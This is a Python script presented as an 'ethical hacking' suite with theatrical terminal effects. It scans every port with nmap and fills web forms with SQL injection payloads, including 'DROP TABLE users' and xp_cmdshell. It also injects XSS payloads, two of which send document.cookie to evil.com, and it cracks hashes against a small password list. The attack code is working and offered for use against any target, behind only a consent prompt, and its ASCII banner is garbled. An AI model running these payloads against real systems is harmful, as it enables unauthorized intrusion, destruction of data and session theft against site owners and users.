#!/usr/bin/env python3
"""
HACKER PRO TERMINAL - Crazy Terminal Effects Edition
World's Deadliest Ethical Hacking Tool Suite with Insane Terminal Effects
Author: Security Research
"""

import argparse
import threading
import time
import requests
import json
import sqlite3
import re
import urllib.parse
import socket
import ssl
import subprocess
import os
import sys
import hashlib
import base64
import random
import string
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import html
import itertools
import nmap
import scapy.all as scapy
from scapy.all import *
import psutil
import platform
import getpass
import math

# Crazy terminal effects
import sys
import os
import time
import random
import threading

class TerminalEffects:
    """Crazy terminal effects for hacker pro"""
    
    def __init__(self):
        self.matrix_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%^&*()_+-=[]{}|;:<>?,./"
        self.hacker_colors = ['\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[95m', '\033[96m', '\033[97m']
        self.reset = '\033[0m'
        self.matrix_rain = []
        self.running = True
        
    def matrix_rain_effect(self, duration=5):
        """Matrix rain effect"""
        try:
            os.system('clear')
            print(f"\033[92m{'='*80}")
            print(f"\033[96m   HACKER PRO - TERMINAL EDITION   ")
            print(f"\033[92m{'='*80}")
            time.sleep(1)
            
            # Create matrix rain
            for _ in range(duration * 20):
                for _ in range(3):
                    x = random.randint(0, 80)
                    y = random.randint(0, 20)
                    char = random.choice(self.matrix_chars)
                    color = random.choice(self.hacker_colors)
                    print(f"\033[{y};{x}H{color}{char}{self.reset}")
                    time.sleep(0.01)
                    
        except KeyboardInterrupt:
            pass
    
    def glitch_effect(self, text, duration=2):
        """Glitch text effect"""
        original = text
        for _ in range(duration * 10):
            # Randomly scramble text
            scrambled = list(original)
            for i in range(len(scrambled)):
                if random.random() > 0.7:
                    scrambled[i] = random.choice(self.matrix_chars)
            
            color = random.choice(self.hacker_colors)
            print(f"\033[1m{color}{''.join(scrambled)}{self.reset}")
            time.sleep(0.1)
        
        # Show original text
        print(f"\033[1m\033[92m{original}{self.reset}")
    
    def typing_effect(self, text, speed=0.05):
        """Typing effect with random colors"""
        for char in text:
            color = random.choice(self.hacker_colors)
            print(f"{color}{char}{self.reset}", end='', flush=True)
            time.sleep(speed)
        print()
    
    def rainbow_effect(self, text):
        """Rainbow text effect"""
        colors = ['\033[91m', '\033[93m', '\033[92m', '\033[96m', '\033[94m', '\033[95m']
        for i, char in enumerate(text):
            color = colors[i % len(colors)]
            print(f"{color}{char}{self.reset}", end='', flush=True)
        print()
    
    def binary_effect(self, text):
        """Convert text to binary and display"""
        binary = ' '.join(format(ord(c), '08b') for c in text)
        print(f"\033[92m{binary}{self.reset}")
    
    def hex_effect(self, text):
        """Convert text to hex and display"""
        hex_text = ' '.join(format(ord(c), '02x') for c in text)
        print(f"\033[93m{hex_text}{self.reset}")
    
    def loading_effect(self, message, duration=3):
        """Crazy loading animation"""
        symbols = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
        for _ in range(duration * 10):
            symbol = random.choice(symbols)
            color = random.choice(self.hacker_colors)
            print(f"\r{color}[{symbol}] {message}{self.reset}", end='', flush=True)
            time.sleep(0.1)
        print(f"\r\033[92m✓ {message}{self.reset}")
    
    def progress_bar_effect(self, current, total, message):
        """Crazy progress bar"""
        percent = (current / total) * 100
        bar_length = 50
        filled = int(bar_length * percent / 100)
        
        # Create crazy progress bar
        bar = ''
        for i in range(bar_length):
            if i < filled:
                bar += random.choice(['█', '▓', '▒', '▀', '■'])
            else:
                bar += random.choice(['░', '▒', '▓', '▁', '·'])
        
        color = random.choice(self.hacker_colors)
        print(f"\r{color}[{bar}] {percent:.1f}% - {message}{self.reset}", end='', flush=True)
    
    def explosion_effect(self, message):
        """Explosion effect"""
        explosion_chars = ['💥', '🔥', '💢', '⚡', '🌟', '✨', '🎆']
        for _ in range(10):
            for char in message:
                explosion = random.choice(explosion_chars)
                print(f"{explosion}{char}", end='', flush=True)
            time.sleep(0.1)
        print()
    
    def cyber_rain(self, text, duration=3):
        """Cyber rain effect"""
        words = text.split()
        for _ in range(duration * 10):
            for word in words:
                x = random.randint(0, 80)
                y = random.randint(0, 20)
                color = random.choice(self.hacker_colors)
                print(f"\033[{y};{x}H{color}{word}{self.reset}")
                time.sleep(0.05)

class HackerProTerminal:
    """HACKER PRO Terminal with Crazy Effects"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'HACKER_PRO_TERMINAL/1.0 - Cyber Warfare Edition'
        })
        self.targets = []
        self.vulnerabilities = []
        self.credentials = []
        self.effects = TerminalEffects()
        self.config = {
            'timeout': 10,
            'threads': 100,
            'delay': 0.1,
            'verify_ssl': False,
            'user_agent': 'HACKER_PRO_TERMINAL/1.0'
        }
        
    def print_crazy_banner(self):
        """Print insane hacker banner"""
        self.effects.matrix_rain_effect(2)
        time.sleep(1)
        
        # Glitch the title
        self.effects.glitch_effect("HACKER PRO TERMINAL", 1)
        time.sleep(0.5)
        
        # Rainbow effect
        self.effects.rainbow_effect("╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
        self.effects.rainbow_effect("║  ██████╗██╗  ██╗ █████╗ ██████╗ ████████╗ ███████╗ ███████╗ ██████╗   █████╗ ██╗  █████╗  ║")
        self.effects.rainbow_effect("║  ██╔══╝██║  ██║ ██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗  ██║  ██║  ██╔══╝ ║")
        self.effects.rainbow_effect("║  ██║  ██║  ██║ ██║  ███████╗██║   ██║███████║██║   ██║███████║██║   ██║  ██║  ██║  ██║  ║")
        self.effects.rainbow_effect("║  ╚██████╔╝██║ ███║╚██████║╚███████║╚███████║╚███████║╚███████║╚███████║  ╚██████╔╝ ██║  ║")
        self.effects.rainbow_effect("║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ║")
        self.effects.rainbow_effect("║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ██║   ║")
        self.effects.rainbow_effect("╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
        
        time.sleep(1)
        self.effects.typing_effect("World's Deadliest Ethical Hacking Tool Suite - Terminal Edition", 0.03)
        self.effects.explosion_effect("INITIALIZING CYBER WARFARE PROTOCOLS...")
        
        # Binary and hex effects
        self.effects.binary_effect("HACKER PRO TERMINAL")
        self.effects.hex_effect("READY FOR CYBER ASSAULT")
        
        print()
        self.effects.loading_effect("LOADING ATTACK MODULES", 2)
        
    def crazy_port_scan(self, target):
        """Crazy port scanning with effects"""
        self.effects.typing_effect(f"[CYBER] Initiating port scan on {target}", 0.02)
        self.effects.loading_effect("SCANNING PORTS", 3)
        
        try:
            nm = nmap.PortScanner()
            
            # Progress tracking
            self.effects.progress_bar_effect(0, 65535, "Port Scan Progress")
            
            nm.scan(target, '1-65535', arguments='-sS -sV -O -A --version-intensity 9')
            
            open_ports = []
            total_ports = 65535
            scanned_ports = 0
            
            for host in nm.all_hosts():
                self.effects.rainbow_effect(f"[TARGET ACQUIRED] {host} ({nm[host].hostname()})")
                
                if nm[host].osmatch():
                    self.effects.glitch_effect(f"[OS DETECTED] {nm[host].osmatch()[0]['name']}", 1)
                
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in sorted(ports):
                        port_info = nm[host][proto][port]
                        if port_info['state'] == 'open':
                            scanned_ports += 1
                            service = port_info['name']
                            version = port_info['product']
                            
                            # Crazy effect for each port
                            self.effects.explosion_effect(f"[PORT {port} OPEN - {service}]")
                            self.effects.binary_effect(f"{service}:{port}")
                            
                            open_ports.append((port, proto, service, version))
                            
                            # Update progress
                            self.effects.progress_bar_effect(scanned_ports, total_ports, "Port Scan Progress")
                            
                            time.sleep(0.1)
            
            self.effects.loading_effect("PORT SCAN COMPLETE", 1)
            self.effects.cyber_rain(f"FOUND {len(open_ports)} OPEN PORTS", 2)
            
            return open_ports
            
        except Exception as e:
            self.effects.glitch_effect(f"[ERROR] Port scan failed: {e}", 2)
            return []
    
    def crazy_sqli_scan(self, target_url):
        """Crazy SQL injection scanning"""
        self.effects.typing_effect(f"[CYBER] Initiating SQL injection assault on {target_url}", 0.02)
        self.effects.loading_effect("PREPARING SQL PAYLOADS", 2)
        
        # Advanced SQLi payloads with crazy effects
        sqli_payloads = [
            "' UNION SELECT NULL,username,password FROM users--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR '1'='1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "1' AND 1=CONVERT(int, (SELECT database()))--",
            "'; DROP TABLE users--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "'; EXEC xp_cmdshell('whoami');--"
        ]
        
        self.effects.cyber_rain("DEPLOYING SQL PAYLOADS", 2)
        
        try:
            response = self.session.get(target_url, timeout=self.config['timeout'])
            
            forms = self.extract_forms(target_url)
            vuln_count = 0
            
            for form in forms:
                form_url = form['action']
                method = form['method'].lower()
                inputs = form['inputs']
                
                self.effects.rainbow_effect(f"[FORM TARGETED] {form_url}")
                
                for payload in sqli_payloads:
                    data = {}
                    for input_field in inputs:
                        if input_field['type'] in ['text', 'search', 'url', 'email', 'password']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = 'test'
                    
                    try:
                        if method == 'post':
                            response = self.session.post(form_url, data=data, timeout=self.config['timeout'])
                        else:
                            response = self.session.get(form_url, params=data, timeout=self.config['timeout'])
                        
                        # Check for SQL errors with crazy effects
                        error_patterns = [
                            r"SQL syntax.*MySQL",
                            r"Warning.*mysql_.*",
                            r"valid PostgreSQL result",
                            r"Npgsql\.",
                            r"org\.postgresql\.util\.PSQLException",
                            r"ERROR: parser: parse error",
                            r"Oracle.*driver",
                            r"Microsoft OLE DB Provider"
                        ]
                        
                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vuln_count += 1
                                self.effects.explosion_effect(f"[SQL INJECTION FOUND] {input_field['name']}")
                                self.effects.glitch_effect(f"[PAYLOAD] {payload}", 1)
                                self.effects.binary_effect("DATABASE COMPROMISED")
                                
                                vuln = {
                                    'id': hashlib.md5(f"{form_url}{payload}".encode()).hexdigest()[:8],
                                    'type': 'SQL Injection',
                                    'severity': 'Critical',
                                    'target': form_url,
                                    'description': f"SQL Injection in parameter '{input_field['name']}'",
                                    'evidence': f"Payload: {payload}",
                                    'timestamp': datetime.now().isoformat()
                                }
                                self.vulnerabilities.append(vuln)
                                break
                    
                    except Exception as e:
                        continue
            
            if vuln_count > 0:
                self.effects.cyber_rain(f"SQL INJECTION SUCCESSFUL - {vuln_count} VULNS FOUND", 3)
            else:
                self.effects.typing_effect("No SQL injection vulnerabilities found", 0.03)
                
        except Exception as e:
            self.effects.glitch_effect(f"[ERROR] SQL injection failed: {e}", 2)
    
    def crazy_xss_scan(self, target_url):
        """Crazy XSS scanning"""
        self.effects.typing_effect(f"[CYBER] Initiating XSS assault on {target_url}", 0.02)
        self.effects.loading_effect("PREPARING XSS PAYLOADS", 2)
        
        # Advanced XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>",
            "javascript:alert('XSS')"
        ]
        
        self.effects.cyber_rain("DEPLOYING XSS PAYLOADS", 2)
        
        try:
            forms = self.extract_forms(target_url)
            vuln_count = 0
            
            for form in forms:
                form_url = form['action']
                method = form['method'].lower()
                inputs = form['inputs']
                
                self.effects.rainbow_effect(f"[XSS TARGET] {form_url}")
                
                for payload in xss_payloads:
                    data = {}
                    for input_field in inputs:
                        if input_field['type'] in ['text', 'search', 'url', 'email', 'textarea']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = 'test'
                    
                    try:
                        if method == 'post':
                            response = self.session.post(form_url, data=data, timeout=self.config['timeout'])
                        else:
                            response = self.session.get(form_url, params=data, timeout=self.config['timeout'])
                        
                        # Check if payload is reflected with crazy effects
                        if payload in response.text:
                            vuln_count += 1
                            self.effects.explosion_effect(f"[XSS FOUND] {input_field['name']}")
                            self.effects.glitch_effect(f"[PAYLOAD] {payload}", 1)
                            self.effects.hex_effect("SCRIPT EXECUTION SUCCESS")
                            
                            vuln = {
                                'id': hashlib.md5(f"{form_url}{payload}".encode()).hexdigest()[:8],
                                'type': 'Cross-Site Scripting',
                                'severity': 'High',
                                'target': form_url,
                                'description': f"XSS in parameter '{input_field['name']}'",
                                'evidence': f"Payload: {payload}",
                                'timestamp': datetime.now().isoformat()
                            }
                            self.vulnerabilities.append(vuln)
                            break
                    
                    except Exception as e:
                        continue
            
            if vuln_count > 0:
                self.effects.cyber_rain(f"XSS SUCCESSFUL - {vuln_count} VULNS FOUND", 3)
            else:
                self.effects.typing_effect("No XSS vulnerabilities found", 0.03)
                
        except Exception as e:
            self.effects.glitch_effect(f"[ERROR] XSS scan failed: {e}", 2)
    
    def crazy_password_crack(self, hash_type, hash_value):
        """Crazy password cracking"""
        self.effects.typing_effect(f"[CYBER] Initiating hash cracking assault", 0.02)
        self.effects.loading_effect("PREPARING DICTIONARY ATTACK", 2)
        
        # Common passwords
        wordlist = [
            'password', '123456', '123456789', 'qwerty', 'abc123', 'password123',
            'admin', 'letmein', 'welcome', 'monkey', '1234567890', 'password1',
            'qwerty123', 'admin123', 'root', 'toor', 'pass', 'test', 'guest'
        ]
        
        self.effects.cyber_rain("DEPLOYING DICTIONARY ATTACK", 2)
        
        for i, password in enumerate(wordlist):
            try:
                if hash_type.lower() == 'md5':
                    cracked_hash = hashlib.md5(password.encode()).hexdigest()
                elif hash_type.lower() == 'sha1':
                    cracked_hash = hashlib.sha1(password.encode()).hexdigest()
                elif hash_type.lower() == 'sha256':
                    cracked_hash = hashlib.sha256(password.encode()).hexdigest()
                else:
                    self.effects.glitch_effect(f"[ERROR] Unsupported hash type: {hash_type}", 2)
                    return None
                
                # Progress effect
                self.effects.progress_bar_effect(i+1, len(wordlist), f"Cracking {hash_type.upper()}")
                
                if cracked_hash == hash_value.lower():
                    self.effects.explosion_effect("[HASH CRACKED]")
                    self.effects.rainbow_effect(f"[PASSWORD FOUND] {password}")
                    self.effects.binary_effect("ACCESS GRANTED")
                    return password
                    
            except Exception as e:
                continue
        
        self.effects.glitch_effect("[HASH CRACKING FAILED]", 2)
        return None
    
    def extract_forms(self, url):
        """Extract forms from HTML"""
        try:
            response = self.session.get(url, timeout=self.config['timeout'])
            forms = []
            
            form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']([^"\']*)["\'][^>]*>'
            
            for form_match in re.finditer(form_pattern, response.text, re.IGNORECASE | re.DOTALL):
                action = form_match.group(1)
                method = form_match.group(2)
                form_html = form_match.group(3)
                
                inputs = []
                for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                    input_name = input_match.group(1)
                    input_type = input_match.group(2)
                    inputs.append({'name': input_name, 'type': input_type})
                
                forms.append({
                    'action': urljoin(url, action),
                    'method': method,
                    'inputs': inputs
                })
            
            return forms
        
        except Exception as e:
            return []
    
    def run_crazy_scan(self, target):
        """Run comprehensive crazy scan"""
        self.effects.typing_effect("[CYBER] INITIATING FULL CYBER ASSAULT", 0.01)
        self.effects.loading_effect("PREPARING ALL ATTACK VECTORS", 3)
        
        # Network reconnaissance
        self.effects.cyber_rain("NETWORK RECONNAISSANCE ACTIVE", 2)
        open_ports = self.crazy_port_scan(target)
        
        # Web application testing
        web_url = f"http://{target}" if any(port[0] in [80, 443, 8080, 8443] for port in open_ports) else f"https://{target}"
        
        self.effects.cyber_rain("WEB APPLICATION ATTACKS", 2)
        self.crazy_sqli_scan(web_url)
        self.crazy_xss_scan(web_url)
        
        # Summary with crazy effects
        self.effects.explosion_effect("CYBER ASSAULT COMPLETE")
        self.effects.rainbow_effect("VULNERABILITIES DISCOVERED:")
        
        for vuln in self.vulnerabilities:
            self.effects.glitch_effect(f"[{vuln['severity']}] {vuln['type']}", 1)
            self.effects.typing_effect(f"Target: {vuln['target']}", 0.02)
        
        self.effects.cyber_rain(f"TOTAL VULNERABILITIES: {len(self.vulnerabilities)}", 3)
        
        # Binary effect for final message
        final_message = f"HACKER PRO TERMINAL SCAN COMPLETE - {len(self.vulnerabilities)} VULNS FOUND"
        self.effects.binary_effect(final_message)
        
        self.effects.explosion_effect("MISSION ACCOMPLISHED")

def main():
    parser = argparse.ArgumentParser(
        description="HACKER PRO TERMINAL - Crazy Terminal Effects Edition",
        epilog="Example: python3 hacker_pro_terminal.py --target 192.168.1.100 --scan-all"
    )
    
    parser.add_argument("--target", help="Target IP or URL")
    parser.add_argument("--scan-all", action="store_true", help="Run all crazy attacks")
    parser.add_argument("--port-scan", action="store_true", help="Crazy port scanning")
    parser.add_argument("--sqli", action="store_true", help="Crazy SQL injection")
    parser.add_argument("--xss", action="store_true", help="Crazy XSS scanning")
    parser.add_argument("--hash-crack", help="Crazy hash cracking (type:hash)")
    parser.add_argument("--matrix", action="store_true", help="Show matrix effect")
    
    args = parser.parse_args()
    
    # Initialize terminal
    terminal = HackerProTerminal()
    
    # Show matrix effect if requested
    if args.matrix:
        terminal.effects.matrix_rain_effect(5)
        return
    
    # Print crazy banner
    terminal.print_crazy_banner()
    
    # Safety warning with effects
    terminal.effects.glitch_effect("WARNING: This is a powerful ethical hacking tool suite!", 2)
    terminal.effects.typing_effect("For authorized security testing ONLY!", 0.03)
    terminal.effects.rainbow_effect("Unauthorized use is illegal and unethical!")
    terminal.effects.explosion_effect("YOU ARE RESPONSIBLE FOR YOUR ACTIONS!")
    
    # Confirm usage
    try:
        confirm = input("Do you understand and accept full responsibility? (yes/no): ")
        if confirm.lower() != 'yes':
            terminal.effects.glitch_effect("OPERATION CANCELLED", 2)
            return
    except KeyboardInterrupt:
        terminal.effects.glitch_effect("OPERATION CANCELLED", 2)
        return
    
    # Run selected attacks
    if args.scan_all and args.target:
        terminal.run_crazy_scan(args.target)
    elif args.port_scan and args.target:
        terminal.crazy_port_scan(args.target)
    elif args.sqli and args.target:
        terminal.crazy_sqli_scan(args.target)
    elif args.xss and args.target:
        terminal.crazy_xss_scan(args.target)
    elif args.hash_crack:
        hash_type, hash_value = args.hash_crack.split(':')
        terminal.crazy_password_crack(hash_type, hash_value)
    else:
        terminal.effects.typing_effect("Please specify an attack option", 0.03)
        terminal.effects.rainbow_effect("Use --help for available options")

if __name__ == "__main__":
    main()
